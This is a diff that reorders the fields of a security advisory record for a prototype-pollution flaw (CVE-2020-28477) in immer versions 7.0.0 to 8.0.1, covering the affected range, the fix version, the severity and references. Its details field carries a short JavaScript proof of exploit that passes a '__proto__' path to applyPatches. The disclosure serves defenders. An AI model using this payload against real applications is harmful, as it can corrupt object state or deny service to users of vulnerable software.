@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-9qmh-276g-x5pj",
-  "summary": "Prototype Pollution in immer",
-  "details": "## Overview\n\nAffected versions of immer are vulnerable to Prototype Pollution.\n\n## Proof of exploit\n\n```js\nconst {applyPatches, enablePatches} = require(\"immer\");\nenablePatches();\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\napplyPatches({}, [ { op: 'add', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\n// applyPatches({}, [ { op: 'replace', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\nconsole.log(\"After : \" + obj.polluted);\n```\n\n## Remediation\n\nVersion 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/01/GHSA-9qmh-276g-x5pj/GHSA-9qmh-276g-x5pj.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "immer",
+        "purl": "pkg:npm/immer"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "7.0.0"
+            },
+            {
+              "fixed": "8.0.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2020-28477"
   ],
-  "modified": "2025-01-14T08:57:00.110130Z",
-  "published": "2021-01-20T21:27:56Z",
   "database_specific": {
-    "nvd_published_at": "2021-01-19T11:15:00Z",
     "cwe_ids": [
       "CWE-471"
     ],
-    "severity": "HIGH",
     "github_reviewed": true,
-    "github_reviewed_at": "2021-01-20T19:37:58Z"
+    "github_reviewed_at": "2021-01-20T19:37:58Z",
+    "nvd_published_at": "2021-01-19T11:15:00Z",
+    "severity": "HIGH"
   },
+  "details": "## Overview\n\nAffected versions of immer are vulnerable to Prototype Pollution.\n\n## Proof of exploit\n\n```js\nconst {applyPatches, enablePatches} = require(\"immer\");\nenablePatches();\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\napplyPatches({}, [ { op: 'add', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\n// applyPatches({}, [ { op: 'replace', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\nconsole.log(\"After : \" + obj.polluted);\n```\n\n## Remediation\n\nVersion 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.",
+  "id": "GHSA-9qmh-276g-x5pj",
+  "modified": "2025-01-14T08:57:00.110130Z",
+  "published": "2021-01-20T21:27:56Z",
   "references": [
     {
       "type": "ADVISORY",
@@ -46,36 +70,12 @@
       "url": "https://www.npmjs.com/package/immer"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "immer",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/immer"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "7.0.0"
-            },
-            {
-              "fixed": "8.0.1"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/01/GHSA-9qmh-276g-x5pj/GHSA-9qmh-276g-x5pj.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Prototype Pollution in immer"
 }
